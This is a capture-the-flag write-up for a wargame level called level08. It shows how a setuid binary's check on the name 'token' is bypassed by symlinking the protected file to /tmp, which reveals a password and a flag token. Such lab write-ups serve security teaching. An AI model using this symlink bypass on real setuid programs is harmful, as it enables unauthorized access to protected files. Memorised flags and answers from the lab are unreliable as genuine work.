# Level08

### 1. Identity

```bash
$ id
uid=2008(level08) gid=2008(level08) groups=2008(level08),100(users)
```

We are logged in as **level08**.

### 2. Home directory

```bash
$ pwd
/home/user/level08

$ ls -la
...
-rwsr-s---+ 1 flag08  level08 8617 Mar  5  2016 level08
-rw-------  1 flag08  flag08    26 Mar  5  2016 token
...
```

Let's execute this binary :

```bash
$ ./level08 token
You may not access 'token'
```

### 3. Analyzing the files

With `strings` :

```bash
$ strings ./level08
strstr
...
%s [file to read]
token
You may not access '%s'
Unable to open %s
Unable to read fd %d
```

It looks like our program it checking the filename only.
If it has `token`, it won't be read.

Unfortunately, it is not possible to copy the file `token` and rename it.

### 4. Exploiting the files

We are going to use **simlinks**.

```bash
$ ln -s /home/user/level08/token /tmp/flag
```

### 5. Getting the flag

Let's try again with our new file.

```bash
$ ./level08 /tmp/flag
quif5eloekouj29ke0vouxean
```

Let's login to flag08

```bash
$ su flag08
Password: quif5eloekouj29ke0vouxean
```

After launching getflag :

```bash
$ getflag
Check flag.Here is your token : 25749xKZ8L7DkSCwJkT9dyv6f
```

End of program